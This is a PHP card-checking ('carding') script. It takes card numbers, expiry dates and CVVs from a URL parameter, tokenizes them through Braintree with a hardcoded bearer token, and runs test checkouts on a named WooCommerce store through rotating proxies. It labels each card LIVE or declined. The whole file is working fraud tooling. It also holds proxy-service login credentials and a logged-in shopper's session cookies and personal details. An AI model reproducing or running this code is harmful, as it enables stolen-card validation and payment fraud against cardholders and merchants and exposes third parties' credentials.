<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

// If(strlen($ano) > 2)
// {
//   $ano = substr($ano,2,2);
// }
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

// $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
// $lname = 'Wang';
// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
// $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);




//============================================================================================================================================================
 // Request 1


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
# Uncomment the upper two lines if you have filled the upper login details
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE1MTkxMjksImp0aSI6ImMyZWZhY2I0LTI0MzMtNDNmMi04YWRjLTM3NmRiNTczODNkMSIsInN1YiI6Im44dmR4eXp3ZHR5cnBndmgiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im44dmR4eXp3ZHR5cnBndmgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7fX0.3LpmEqV7FgUM9X6HTA-quCQ8Fsd6_OowP7MXzK3w-bxHCsPvo2DlTsMz3kgNz3t_H7X5GGCo7VkKf8VqoFI2QA',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://payments.braintree-api.com/',
'user-agent: '.$browser.''
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"de2bbd5e-16cf-4053-b9d7-dc231f3288d8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$b_pago = curl_exec($ch);

curl_close($ch);

   echo $b_pago;
$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
$issuebank = trim(strip_tags(getstr($b_pago,'"bank": "','"')));
$issuecountry = trim(strip_tags(getstr($b_pago,'"country": "','"')));
$type = trim(strip_tags(getstr($b_pago,'"financing": "','"')));
$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://retomarket.blog/?wc-ajax=checkout');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _wpfuuid=dd0815ce-0bb8-4b49-8421-2a93b80c8c4f; trustedsite_visit=1; _tccl_visitor=23405370-4470-4156-acab-0762da4fc13e; messagesUtk=79a7771f485a454bb23332115a5a7845; MCPopupClosed=yes; woocommerce_items_in_cart=1; woocommerce_cart_hash=ca6c225911071ac14987f1fd8938be04; mailchimp.cart.current_email=vvarne4r3@gmail.com; mailchimp_user_previous_email=vvarne4r3%40gmail.com; mailchimp_user_email=vvarne4r3%40gmail.com; wordpress_logged_in_3b65cd43bb114f6a493430445ca907d5=vincent.warner%7C1592642355%7ChD0t7wXMrGnQq8jAnrz85aqBxRLDbjf1hoIQyL1zX75%7C2fdf421684d2f386d76756dbf46e1639c911c41c934d7b0e7e21e06c7e0389df; wp_woocommerce_session_3b65cd43bb114f6a493430445ca907d5=8582%7C%7C1591591129%7C%7C1591587529%7C%7Cea07be48de77fb1f2572598ab4939bcf; mailchimp_landing_site=https%3A%2F%2Fretomarket.blog%2F%3Fwc-ajax%3Dupdate_order_review; mailchimp.cart.previous_email=vvarne4r3@gmail.com; _tccl_visit=23409550-7540-4f5a-b3b9-0895e6b1bcf5',
'origin: https://retomarket.blog',
'referer: https://retomarket.blog/checkout/',
'user-agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=CA&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=4144&billing_city=Miami&billing_state=ON&billing_postcode=M3h6b1&billing_phone=5182641524&billing_email=vvarne4r3%40gmail.com&mailchimp_woocommerce_newsletter=1&order_comments=&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=8.96&wc-braintree-credit-card-cart-contains-subscription=1&wc_braintree_credit_card_payment_nonce='.$token.'&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=8.96&wc_braintree_paypal_currency=CAD&wc_braintree_paypal_locale=en_ca&wc-braintree-paypal-tokenize-payment-method=true&terms=on&terms-field=1&woocommerce-process-checkout-nonce=56f97ac6ee&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

// // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);

$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"')));
//  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
//  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));


// //////////////////////// BIN INFO ////////////////////////////////

// /////////////////// RESULT ////////////////////////////////////
if(strpos($result,'"result":"success"')){
    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat-'.$category.'</font></b></font></td></tr>';


   }
elseif(strpos($result,'Insufficient Funds')){
  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
   }
else {

       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' |  '.$type.' | cat- '.$category.'</font></b></font></td></tr>';

// updatecart();
}

curl_close($curl);
ob_flush();
       // echo $result;
//echo $browser;
?>
